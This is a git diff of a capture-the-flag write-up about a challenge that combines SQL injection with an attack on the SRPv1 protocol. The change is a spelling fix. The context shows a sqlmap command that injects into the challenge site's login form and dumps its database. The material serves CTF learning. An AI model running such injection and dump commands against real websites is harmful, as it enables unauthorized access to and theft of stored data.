@@ -2,7 +2,7 @@
 There are two phases to this problem: a SQL injection to recover some data, and an attack on [SRPv1](https://en.wikipedia.org/wiki/Secure_Remote_Password_protocol) that relies on the recovered data.
 
 ## SQL Injection
-We are given a [website](http://tonnerre.pwning.xxx:8560/) with a username and password login form. Initial tests confirm that both fields are injectible. We'll let [sqlmap](sqlmap.org) do all the heavy lifting:
+We are given a [website](http://tonnerre.pwning.xxx:8560/) with a username and password login form. Initial tests confirm that both fields are injectable. We'll let [sqlmap](sqlmap.org) do all the heavy lifting:
 
 ```
 python sqlmap.py -u "http://tonnerre.pwning.xxx:8560/login.php" --method POST --data "username=asdjf&password=asdjf" -p "username" --dump
